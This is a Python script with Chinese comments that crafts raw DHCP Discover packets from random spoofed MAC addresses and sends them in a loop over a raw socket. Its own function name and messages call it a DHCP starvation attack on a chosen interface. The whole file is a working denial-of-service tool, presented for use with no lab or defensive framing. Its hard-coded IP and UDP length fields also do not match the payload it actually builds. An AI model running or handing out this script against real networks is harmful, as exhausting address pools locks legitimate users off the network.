#!/usr/bin/env python3
"""
精确的DHCP Discover报文生成脚本
确保包含必要的DHCP选项，能被标准解析器识别
"""

import socket
import struct
import random
import time
import sys


def generate_random_mac():
    """生成随机MAC地址"""
    return bytes([0x02, 0x00, 0x00] + [random.randint(0, 255) for _ in range(3)])


def create_dhcp_discover(mac_address):
    """创建精确的DHCP Discover报文"""
    # 生成随机事务ID
    xid = random.randint(0, 0xFFFFFFFF)

    # 以太网头
    eth_header = (
        b"\xff\xff\xff\xff\xff\xff"  # 目标MAC: 广播
        + mac_address  # 源MAC: 随机
        + b"\x08\x00"  # 以太网类型: IPv4
    )

    # IP头
    ip_header = (
        b"\x45"  # 版本(4) + 头长度(5)
        + b"\x00"  # 服务类型
        + b"\x01\x48"  # 总长度: 328字节
        + b"\x00\x00"  # 标识
        + b"\x00\x00"  # 标志 + 片偏移
        + b"\x40"  # TTL: 64
        + b"\x11"  # 协议: UDP (17)
        + b"\x00\x00"  # 头校验和 (先设为0)
        + b"\x00\x00\x00\x00"  # 源IP: 0.0.0.0
        + b"\xff\xff\xff\xff"  # 目标IP: 255.255.255.255
    )

    # UDP头
    udp_header = (
        b"\x00\x44"  # 源端口: 68
        + b"\x00\x43"  # 目标端口: 67
        + b"\x01\x34"  # UDP长度: 308字节
        + b"\x00\x00"  # UDP校验和 (先设为0)
    )

    # DHCP Discover载荷
    dhcp_payload = (
        # BOOTP头
        b"\x01"  # 操作码: 1 (请求)
        + b"\x01"  # 硬件类型: 1 (以太网)
        + b"\x06"  # 硬件地址长度: 6
        + b"\x00"  # 跳数: 0
        + struct.pack("!I", xid)  # 事务ID
        + b"\x00\x00"  # 秒数
        + b"\x00\x00"  # 标志
        + b"\x00\x00\x00\x00"  # 客户端IP地址: 0.0.0.0
        + b"\x00\x00\x00\x00"  # 你的IP地址: 0.0.0.0
        + b"\x00\x00\x00\x00"  # 服务器IP地址: 0.0.0.0
        + b"\x00\x00\x00\x00"  # 网关IP地址: 0.0.0.0
        + mac_address
        + b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"  # 客户端硬件地址
        +
        # 服务器主机名 (64字节)
        b"\x00" * 64
        +
        # 启动文件名 (128字节)
        b"\x00" * 128
        +
        # DHCP选项
        b"\x63\x82\x53\x63"  # Magic cookie
        + b"\x35\x01\x01"  # 选项53: DHCP消息类型 (1 = Discover)
        + b"\x37\x04\x01\x03\x06\x2a"  # 选项55: 参数请求列表
        + b"\xff"  # 选项255: 结束
    )

    # 计算IP头校验和
    ip_without_checksum = ip_header
    words = struct.unpack("!10H", ip_without_checksum)
    total = sum(words)
    total = (total & 0xFFFF) + (total >> 16)
    checksum = ~total & 0xFFFF
    ip_header = (
        ip_without_checksum[:10]
        + struct.pack("!H", checksum)
        + ip_without_checksum[12:]
    )

    return eth_header + ip_header + udp_header + dhcp_payload


def dhcp_starvation_attack(interface, count=30, delay=0.05):
    """发送精确的DHCP Discover报文"""
    print(f"🔥 开始DHCP饿死攻击，目标接口: {interface}")

    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((interface, 0))
    except Exception as e:
        print(f"❌ 创建套接字失败: {e}")
        return

    for i in range(count):
        random_mac = generate_random_mac()
        dhcp_packet = create_dhcp_discover(random_mac)

        try:
            s.send(dhcp_packet)
            if i % 10 == 0:
                print(f"📤 已发送 {i} 个DHCP Discover请求...")
        except Exception as e:
            print(f"❌ 发送失败: {e}")
            break

        time.sleep(delay)

    s.close()
    print("✅ 攻击完成!")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python3 dhcp_starvation_precise.py <接口名>")
        sys.exit(1)

    dhcp_starvation_attack(sys.argv[1])
